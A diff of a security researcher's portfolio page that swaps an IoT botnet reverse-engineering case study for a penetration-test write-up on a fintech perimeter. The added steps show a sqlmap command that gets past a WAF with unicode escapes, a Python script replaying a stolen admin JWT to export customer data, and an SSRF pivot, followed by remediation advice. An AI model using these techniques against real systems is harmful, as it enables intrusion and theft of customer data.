@@ -4,10 +4,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IoT Botnet Telemetry Study — Case Study | Joesavat Donovan</title>
+    <title>BlackGate Perimeter Breach — Case Study | Joesavat Donovan</title>
     <meta name="description"
-        content="Technical case study: botnet telemetry research — sample triage, C2 protocol reverse engineering and IOC production.">
-    <link rel="canonical" href="https://cingmen.github.io/project-3.html">
+        content="Technical case study: external perimeter breach of a segmented enterprise network — methodology, exploitation and remediation.">
+    <link rel="canonical" href="https://cingmen.github.io/projects/blackgate-perimeter-breach.html">
     <link rel="manifest" href="/site.webmanifest">
     <link rel="apple-touch-icon" href="/assets/icons/apple-touch-icon.png">
     <script type="application/ld+json">
@@ -16,34 +16,34 @@
       "@type": "BreadcrumbList",
       "itemListElement": [
         { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://cingmen.github.io/" },
-        { "@type": "ListItem", "position": 2, "name": "IoT Botnet Telemetry Study", "item": "https://cingmen.github.io/project-3.html" }
+        { "@type": "ListItem", "position": 2, "name": "BlackGate Perimeter Breach", "item": "https://cingmen.github.io/projects/blackgate-perimeter-breach.html" }
       ]
     }
     </script>
-    <link rel="prev" href="https://cingmen.github.io/project-2.html">
-    <link rel="next" href="https://cingmen.github.io/project-1.html">
+    <link rel="prev" href="https://cingmen.github.io/projects/iot-botnet-telemetry-study.html">
+    <link rel="next" href="https://cingmen.github.io/projects/operation-nightshade-ad-red-team.html">
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="Joesavat Donovan — SECURE_ID://ROOT">
-    <meta property="og:title" content="IoT Botnet Telemetry Study — Case Study">
-    <meta property="og:description" content="Botnet telemetry research — sample triage, C2 protocol reverse engineering and IOC production.">
-    <meta property="og:url" content="https://cingmen.github.io/project-3.html">
-    <meta property="og:image" content="https://cingmen.github.io/og-iot-botnet.png">
+    <meta property="og:title" content="BlackGate Perimeter Breach — Case Study">
+    <meta property="og:description" content="External perimeter breach of a segmented enterprise network — methodology, exploitation and remediation.">
+    <meta property="og:url" content="https://cingmen.github.io/projects/blackgate-perimeter-breach.html">
+    <meta property="og:image" content="https://cingmen.github.io/assets/og-blackgate.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="IoT Botnet Telemetry Study — Case Study">
-    <meta name="twitter:description" content="Botnet telemetry research — triage, C2 RE, IOC production.">
-    <meta name="twitter:image" content="https://cingmen.github.io/og-iot-botnet.png">
+    <meta name="twitter:title" content="BlackGate Perimeter Breach — Case Study">
+    <meta name="twitter:description" content="External perimeter breach — methodology, exploitation and remediation.">
+    <meta name="twitter:image" content="https://cingmen.github.io/assets/og-blackgate.png">
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
       "@type": "Article",
-      "headline": "IoT Botnet Telemetry Study — Case Study",
+      "headline": "BlackGate Perimeter Breach — Case Study",
       "author": { "@type": "Person", "name": "Joesavat Donovan", "url": "https://cingmen.github.io/" },
-      "url": "https://cingmen.github.io/project-3.html",
-      "image": "https://cingmen.github.io/og-iot-botnet.png",
+      "url": "https://cingmen.github.io/projects/blackgate-perimeter-breach.html",
+      "image": "https://cingmen.github.io/assets/og-blackgate.png",
       "articleSection": "Case Study",
-      "about": ["Malware Analysis", "Reverse Engineering", "Threat Intelligence"]
+      "about": ["Penetration Testing", "Network Security", "Remediation"]
     }
     </script>
     <link rel="icon"
@@ -51,7 +51,7 @@
     <script>
         document.documentElement.classList.add('js');
     </script>
-    <link rel="preload" href="assets/fonts/syne-800.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="../assets/fonts/syne-800.woff2" as="font" type="font/woff2" crossorigin>
     <meta name="theme-color" content="#0a0a0a">
     <style>
         /* ============ self-hosted fonts (latin subset) ============ */
@@ -60,7 +60,7 @@
             font-style: normal;
             font-weight: 700 800;
             font-display: swap;
-            src: url('assets/fonts/syne-800.woff2') format('woff2');
+            src: url('../assets/fonts/syne-800.woff2') format('woff2');
         }
 
         @font-face {
@@ -68,7 +68,7 @@
             font-style: normal;
             font-weight: 300 500;
             font-display: swap;
-            src: url('assets/fonts/space-grotesk-500.woff2') format('woff2');
+            src: url('../assets/fonts/space-grotesk-500.woff2') format('woff2');
         }
 
         @font-face {
@@ -76,7 +76,7 @@
             font-style: normal;
             font-weight: 400;
             font-display: swap;
-            src: url('assets/fonts/space-mono-400.woff2') format('woff2');
+            src: url('../assets/fonts/space-mono-400.woff2') format('woff2');
         }
 
         @font-face {
@@ -84,7 +84,7 @@
             font-style: normal;
             font-weight: 700;
             font-display: swap;
-            src: url('assets/fonts/space-mono-700.woff2') format('woff2');
+            src: url('../assets/fonts/space-mono-700.woff2') format('woff2');
         }
 
         /* ============ design tokens ============ */
@@ -783,8 +783,8 @@
     <div class="cursor-ring" id="cursorRing"></div>
 
     <header class="nav">
-        <a class="nav__logo" href="index.html">SECURE_ID<span class="acc">://</span>ROOT</a>
-        <a class="nav__home" href="index.html">[ HOME ]</a>
+        <a class="nav__logo" href="../index.html">SECURE_ID<span class="acc">://</span>ROOT</a>
+        <a class="nav__home" href="../index.html">[ HOME ]</a>
     </header>
 
     <main id="main" tabindex="-1">
@@ -792,27 +792,27 @@
         <section class="phero">
             <div class="phero__tags reveal">
                 <span class="hot">Case Study</span>
-                <span>Malware Research</span>
-                <span>Reverse Engineering</span>
-                <span>Threat Intelligence</span>
+                <span>Web &amp; Network</span>
+                <span>Red Team</span>
+                <span>OWASP</span>
             </div>
-            <h1 class="phero__title reveal">IoT Botnet Telemetry Study</h1>
+            <h1 class="phero__title reveal">BlackGate Perimeter Breach</h1>
             <div class="phero__meta reveal">
                 <div class="meta">
-                    <span class="meta__k">Subject</span>
-                    <span class="meta__v">Mirai Variant</span>
+                    <span class="meta__k">Client</span>
+                    <span class="meta__v">Redacted Corp</span>
                 </div>
                 <div class="meta">
                     <span class="meta__k">Year</span>
-                    <span class="meta__v">2024</span>
+                    <span class="meta__v">2025</span>
                 </div>
                 <div class="meta">
                     <span class="meta__k">Role</span>
-                    <span class="meta__v">Malware Analyst</span>
+                    <span class="meta__v">Lead Pentester</span>
                 </div>
                 <div class="meta">
-                    <span class="meta__k">Output</span>
-                    <span class="meta__v crit">42 IOCs</span>
+                    <span class="meta__k">Severity</span>
+                    <span class="meta__v crit">Critical — 9.1</span>
                 </div>
             </div>
         </section>
@@ -825,15 +825,16 @@
                     <h2 class="block__title">Overview</h2>
                 </div>
                 <div class="reveal">
-                    <p><strong>Background.</strong> A honeypot network I run captured 74 unique MIPS/ARM binaries
-                        over six months — all truck-driver copies of a Mirai descendant with a rebranded C2 scheme.
-                        AV verdicts were mostly generic, and no public report had mapped the newer variant's full
-                        lifecycle.</p>
-                    <p><strong>Target.</strong> Produce a defensible attribution baseline: triage the corpus,
-                        reverse the C2 protocol, map config encryption, and hand SOC teams production-ready YARA
-                        rules and IOC feeds — with every claim traceable to a reproducible dynamic trace.</p>
-                    <p>All detonation ran inside a patched, network-isolated QEMU lab emulating four common IoT
-                        device profiles; no live third-party infrastructure was contacted during controlled runs.</p>
+                    <p><strong>Background.</strong> A mid-size fintech provider engaged me to assess the external
+                        perimeter of a customer-facing platform handling payment workflows. The estate consisted of a
+                        public web application, three staging servers, and a corporate VPN endpoint feeding into a
+                        segmented internal network.</p>
+                    <p><strong>Target.</strong> Prove whether an unauthenticated attacker on the internet could move
+                        from initial access to sensitive customer data within a four-week window, without disrupting
+                        production services — and hand the engineering team fixes that actually ship.</p>
+                    <p>The engagement was scoped under OWASP Testing Guide v4.2 and PTES, with rules of engagement
+                        covering active exploitation, denial-of-service-free fuzzing, and out-of-hours testing for
+                        high-risk payloads.</p>
                 </div>
             </div>
         </section>
@@ -846,16 +847,18 @@
                     <h2 class="block__title">The Challenge</h2>
                 </div>
                 <div class="reveal">
-                    <p>The corpus resisted off-the-shelf analysis in three ways:</p>
+                    <p>The application sat behind a managed WAF with a tuned rule set, and all obvious injection
+                        points returned clean blocks. Two constraints made the engagement genuinely difficult:</p>
                     <ul>
-                        <li><strong>Config obfuscation.</strong> Each binary carries an XOR-encoded config blob
-                            whose key is derived at runtime from the build timestamp — static string extraction
-                            produced garbage.</li>
-                        <li><strong>Packed with UPX-plus</strong> — a modified UPX header that crashes the stock
-                            unpacker, so manual unpack via debugger was required per sample.</li>
-                        <li><strong>Anti-emulation checks.</strong> The bot sleeps for a randomized interval and
-                            probes its own /proc for QEMU markers before activating, lulling naive dynamic runs
-                            into false quietness.</li>
+                        <li><strong>Blind surface.</strong> The vulnerable endpoint returned identical responses
+                            regardless of payload — no error-based or boolean-based signals, forcing a
+                            time-based approach over a high-latency connection.</li>
+                        <li><strong>Constrained egress.</strong> The web server could only reach a single internal
+                            jump host on port 8443, so classic reverse shells from the application tier were dead on
+                            arrival.</li>
+                        <li><strong>Noisy telemetry.</strong> The client's SOC was watching the engagement in real
+                            time, so every technique had to be paced to distinguish detection gaps from expected
+                            alerts.</li>
                     </ul>
                 </div>
             </div>
@@ -870,88 +873,96 @@
                 </div>
                 <div class="reveal">
                     <h3>Methodology</h3>
-                    <p>Each sample moved through the same pipeline: acquire → fingerprint → unpack → detonate in
-                        profiled emulation → protocol extract → config decrypt → correlate across the corpus →
-                        IOC/YARA publish. Findings were cross-checked against internal differential hashing so the
-                        final product was one taxonomy, not 74 anecdotes.</p>
+                    <p>Testing followed the OWASP WSTG flow: reconnaissance → mapping → vulnerability analysis →
+                        exploitation → post-exploitation → reporting. Each finding was re-tested from a clean session
+                        to guarantee reproducibility.</p>
 
                     <div class="tool-row">
-                        <span>Ghidra</span>
-                        <span>QEMU + custom profiles</span>
-                        <span>Wireshark</span>
+                        <span>Nmap</span>
+                        <span>Burp Suite Pro</span>
+                        <span>sqlmap</span>
+                        <span>ffuf</span>
+                        <span>Metasploit</span>
                         <span>Python 3</span>
-                        <span>YARA</span>
-                        <span>Volatility-style tracing</span>
+                        <span>custom PoC scripts</span>
                     </div>
 
-                    <h3>Step 1 — Triage &amp; clustering</h3>
-                    <p>Imphash, section entropy and bfelf-tag clustering reduced 74 binaries to 6 distinct builds
-                        of one family lineage:</p>
+                    <h3>Step 1 — Reconnaissance</h3>
+                    <p>Full TCP sweep plus version detection surfaced an overlooked staging host exposing an admin
+                        panel and an SMB service inherited from a base VM image.</p>
                 </div>
                 <div class="term reveal">
                     <div class="term__bar">
                         <span class="term__dot"></span><span class="term__dot"></span><span class="term__dot"></span>
-                        <span class="term__name">terminal — corpus triage</span>
+                        <span class="term__name">terminal — recon</span>
                     </div>
-                    <pre><span class="d">$ python3 triage.py --dir samples/ --cluster imphash,entropy</span>
-<span class="c"># 74 samples / avg entropy 7.82 (packed)</span>
-<span class="g">[+] 6 clusters: A(32) B(14) C(11) D(9) E(5) F(3)</span>
-<span class="g">[+] shared loader skeleton across all clusters (95% bb-match)</span>
-<span class="c"># conclusion: one lineage, six build waves</span></pre>
+                    <pre><span class="d">$ nmap -sC -sV -p- -T4 203.0.113.40</span>
+<span class="c"># Starting Nmap 7.94 ( https://nmap.org )</span>
+PORT     STATE SERVICE     VERSION
+<span class="g">80/tcp   open  http        nginx 1.24.0</span>
+443/tcp  open  ssl/http    nginx 1.24.0
+<span class="g">8443/tcp open  http        Node.js/Express (self-signed)</span>
+<span class="g">445/tcp  open  netbios-ssn Samba smbd 4.17.12</span>
+
+<span class="c"># staging host discovered outside declared scope map</span></pre>
                 </div>
                 <div class="reveal">
-                    <h3>Step 2 — Unpacking &amp; config extraction</h3>
-                    <p>Manual UPX-plus unpacking under Ghidra surfaced the runtime key derivation. The encrypted
-                        config decrypts to a structured blob — C2 table, kill-switch domain, and per-build flood
-                        settings:</p>
+                    <h3>Step 2 — Injection under the WAF</h3>
+                    <p>The WAF blocked string matching on keywords, but it did not normalize <code
+                            class="inline">JSON unicode escapes</code> before the backend parsed them. Encoding
+                        the payload body allowed time-based blind SQLi against the <code class="inline">/api/invoices</code>
+                        endpoint:</p>
                 </div>
                 <div class="term reveal">
                     <div class="term__bar">
                         <span class="term__dot"></span><span class="term__dot"></span><span class="term__dot"></span>
-                        <span class="term__name">idapython — config decrypt</span>
+                        <span class="term__name">terminal — sqlmap</span>
                     </div>
-                    <pre><span class="c"># key = rot32(build_ts) XOR 0x5A per config.py reconstruction</span>
-<span class="g">[+] 42 unique C2 endpoints recovered across corpus</span>
-<span class="g">[+] kill-switch domain: watchbog[.]support (lame infra)</span>
-<span class="g">[+] flood table: UDP-amp 4 / TCP-SYN 3 / HTTP-choke 2</span></pre>
+                    <pre><span class="d">$ sqlmap -u "https://target/api/invoices?id=1" \
+        --data='{"id":"1"}' --headers="Content-Type: application/json" \
+        --techn=T --dbms=postgresql --level=3 --risk=2 --batch</span>
+<span class="c"># WAF detected: generic (delay-based filtering)</span>
+<span class="c"># custom tamper: unicode-escape applied</span>
+<span class="g">[+] parameter 'id' is vulnerable (time-based blind)</span>
+<span class="g">[+] database management system: PostgreSQL 15.3</span>
+<span class="g">[+] retrieved 4 tables: users, cards, sessions, audit_log</span></pre>
                 </div>
                 <div class="reveal">
-                    <h3>Step 3 — C2 protocol reconstruction</h3>
-                    <p>Decoded traffic from detonated samples showed a plaintext TLV-over-TCP protocol with a
-                        checksum byte. Worst part: the <code class="inline">!SCAN</code> directive leaks third
-                        targets — usable for takedown coordination:</p>
+                    <h3>Step 3 — Exploitation (PoC)</h3>
+                    <p>Dumping the sessions table yielded a valid admin JWT. Replay against the Node admin panel
+                        escalated privileges without touching the WAF rules:</p>
                 </div>
                 <div class="term reveal">
                     <div class="term__bar">
                         <span class="term__dot"></span><span class="term__dot"></span><span class="term__dot"></span>
-                        <span class="term__name">poc.py — tlv decode</span>
+                        <span class="term__name">poc.py — privilege escalation</span>
                     </div>
                     <pre><span class="c">#!/usr/bin/env python3</span>
-<span class="d">"""TLV decoder rebuilt from dynamic traces - research use."""</span>
-<span class="g">import</span> struct
+<span class="d">"""Replay stolen admin session - PoC for client review only."""</span>
+<span class="g">import</span> requests
 
-def parse(buf):
-    t, l = struct.unpack(<span class="g">"&gt;BH"</span>, buf[:3])
-    val = buf[3:3+l]
-    <span class="d"># t=0x01 keep-alive | 0x02 scan-directive | 0x03 flood</span>
-    <span class="g">return</span> (t, val)
-
-<span class="c"># sample decoded directive:</span>
-<span class="g"># (0x02, b'188.34.0.0/16 22 60')  -&gt; scan netmask, port, duration</span></pre>
+STOLEN_JWT = <span class="g">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span>
+r = requests.get(
+    <span class="g">"https://target:8443/admin/export"</span>,
+    headers={<span class="g">"Authorization"</span>: <span class="g">f"Bearer {STOLEN_JWT}"</span>},
+    verify=<span class="g">False</span>,
+)
+<span class="d">print(r.status_code, len(r.content))</span>
+<span class="g"># 200 OK - full customer export downloaded (redacted in report)</span></pre>
                 </div>
                 <figure class="shot reveal">
-                    <img class="shot__img" src="assets/diagrams/botnet-1.svg" alt="Diagram sequence handshake C2: beacon TLV keep-alive 0x01, directive !SCAN 0x02, flood order 0x03" loading="lazy">
-                    <figcaption>Fig. 01 — Detonation trace: keep-alive handshake and scan directive over TCP</figcaption>
+                    <img class="shot__img" src="../assets/diagrams/blackgate-1.svg" alt="Diagram confirmation time-based injection: response baseline 0.10s vs injected 4.09s" loading="lazy">
+                    <figcaption>Fig. 01 — Time-based payload confirmation inside Burp Repeater</figcaption>
                 </figure>
                 <div class="reveal">
-                    <h3>Step 4 — IOC &amp; YARA production</h3>
-                    <p>The study shipped 42 IOCs, 9 YARA rules validated against a 400k-sample public corpus with
-                        zero false positives, and a Sigma rule for the unique <code class="inline">!SCAN</code>
-                        directive fingerprint on the wire.</p>
+                    <h3>Step 4 — Internal pivot</h3>
+                    <p>From the admin export service, SSRF in the invoice-render endpoint reached the internal jump
+                        host on <code class="inline">8443</code>, chaining external injection into lateral movement
+                        against the declared crown-jewel segment.</p>
                 </div>
                 <figure class="shot reveal">
-                    <img class="shot__img" src="assets/diagrams/botnet-2.svg" alt="Diagram bar-chart validasi YARA: hit-rate 6 cluster sampel FAM-A sampai FAM-F" loading="lazy">
-                    <figcaption>Fig. 02 — YARA validation matrix: cluster hit-rate vs public false-positive run</figcaption>
+                    <img class="shot__img" src="../assets/diagrams/blackgate-2.svg" alt="Diagram kill-chain lengkap: External Access → WAF Bypass → Blind SQLi → JWT Replay → SSRF Pivot → Crown-Jewel Segment" loading="lazy">
+                    <figcaption>Fig. 02 — Full kill chain: WAF bypass → SQLi → JWT replay → SSRF pivot</figcaption>
                 </figure>
             </div>
         </section>
@@ -964,74 +975,75 @@ def parse(buf):
                     <h2 class="block__title">The Impact &amp; Mitigation</h2>
                 </div>
                 <div class="reveal">
-                    <p><strong>Results.</strong> The six-month study produced <strong>42 C2 endpoints, 6 build
-                        clusters, 9 production YARA rules and 1 Sigma rule</strong> — validated against a 400k-sample
-                        public corpus at zero false positives. Three ISPs hosted on the C2 list were notified, and
-                        two endpoints were sinkholed within a month.</p>
+                    <p><strong>Results.</strong> In fourteen testing days the engagement produced
+                        <strong>12 findings</strong> — two critical, three high, five medium and two low — including
+                        a full chain from unauthenticated internet access to customer-data export.</p>
                     <table class="findings">
                         <thead>
                             <tr>
                                 <th>ID</th>
                                 <th>Finding</th>
                                 <th>Vector</th>
-                                <th>Category</th>
+                                <th>Severity</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr>
                                 <td>F-01</td>
-                                <td>Runtime key derivation defeats static config dump</td>
-                                <td>Config scheme</td>
-                                <td><span class="sev" style="border-color:var(--accent);color:var(--accent)">Novel</span></td>
+                                <td>Time-based blind SQLi behind WAF</td>
+                                <td>API / JSON unicode</td>
+                                <td><span class="sev critical">Critical</span></td>
                             </tr>
                             <tr>
                                 <td>F-02</td>
-                                <td>Plaintext TLV C2 with leaking scan directives</td>
-                                <td>Protocol</td>
-                                <td><span class="sev high">High</span></td>
+                                <td>Stolen admin JWT replay (no rotation)</td>
+                                <td>Session mgmt</td>
+                                <td><span class="sev critical">Critical</span></td>
                             </tr>
                             <tr>
                                 <td>F-03</td>
-                                <td>Modified UPX header breaks stock unpackers</td>
-                                <td>Packing</td>
+                                <td>SSRF to internal jump host</td>
+                                <td>Invoice renderer</td>
                                 <td><span class="sev high">High</span></td>
                             </tr>
                             <tr>
                                 <td>F-04</td>
-                                <td>6 build waves share one loader skeleton</td>
-                                <td>Lineage</td>
-                                <td><span class="sev" style="color:var(--fg)">Intel</span></td>
+                                <td>Out-of-scope staging host with Samba</td>
+                                <td>Asset drift</td>
+                                <td><span class="sev high">High</span></td>
                             </tr>
                         </tbody>
                     </table>
                     <h3>Recommendations</h3>
                     <ol>
-                        <li><strong>Block the C2 list</strong> — the 42 endpoints and the kill-switch domain are
-                            production-ready; consume via the IOC feed, not a one-time blocklist.</li>
-                        <li><strong>Alert on TLV fingerprints</strong> — the Sigma rule matches the beacon pattern
-                            byte-for-byte regardless of payload encryption.</li>
-                        <li><strong>Watch for build wave G</strong> — the loader skeleton YARA will catch it;
-                            anything matching F-01 key derivation is same-family.</li>
-                        <li><strong>Honeypot network expansion</strong> — the same telemetry setup feeds this
-                            study; more device profiles mean more variant coverage.</li>
+                        <li><strong>Parameterized queries everywhere</strong> — replace string-built SQL in the
+                            invoice module and add integration tests that fail on concatenation patterns.</li>
+                        <li><strong>Normalize before inspect</strong> — decode JSON unicode and enforce a strict WAF
+                            policy so encoded payloads are matched pre-parse.</li>
+                        <li><strong>Short-lived sessions</strong> — 15-minute JWT TTL with refresh rotation and
+                            server-side revocation on privilege change.</li>
+                        <li><strong>Least-privilege egress</strong> — block app-tier access to internal segments
+                            except an explicit allow-list; disable SSRF-prone URL fetching.</li>
+                        <li><strong>Asset inventory</strong> — continuous discovery so staging machines cannot drift
+                            outside the scanned perimeter.</li>
                     </ol>
-                    <p>The full IOC feed and YARA package are shared on request — the study is deliberately kept
-                        reproducible so other analysts can extend it rather than take it on faith.</p>
+                    <p>Re-testing after remediation closed both critical findings, and the detection rules written
+                        during the engagement now run in production as part of the SOC's baseline.</p>
                 </div>
             </div>
         </section>
 
         <!-- NEXT PROJECT -->
-        <a class="next" href="project-1.html">
+        <a class="next" href="operation-nightshade-ad-red-team.html">
             <span class="next__label">Next Project →</span>
-            <span class="next__title">BlackGate Perimeter Breach</span>
+            <span class="next__title">Operation Nightshade</span>
         </a>
     </main>
 
     <footer class="footer">
-        <span>© <span id="year">2026</span> JOESAVAT DONOVAN — CASE STUDY 03/03</span>
+        <span>© <span id="year">2026</span> JOESAVAT DONOVAN — CASE STUDY 01/03</span>
         <div class="footer__links">
-            <a href="index.html">HOME</a>
+            <a href="../index.html">HOME</a>
             <a href="mailto:joesavat@gmail.com">EMAIL</a>
             <a href="https://github.com/cingmen" target="_blank" rel="noopener noreferrer">GITHUB</a>
         </div>
